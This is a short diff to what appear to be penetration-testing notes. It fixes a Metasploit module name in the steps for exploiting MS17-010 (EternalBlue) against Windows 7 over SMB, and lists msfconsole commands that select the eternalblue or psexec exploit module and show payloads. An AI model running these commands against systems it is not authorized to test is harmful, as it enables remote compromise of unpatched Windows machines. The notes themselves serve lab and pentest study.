@@ -33,7 +33,7 @@ Find what services are running on open ports:
 > msfconsole
   // use MS17010 for Windows 7: 
 > search MS17-010
-> use exploit/windows/smb/ms_17_010_eternalblue
+> use exploit/windows/smb/ms17_010_eternalblue
   // or
 > use exploit/windows/smb/ms17_010_psexec
 > show payloads
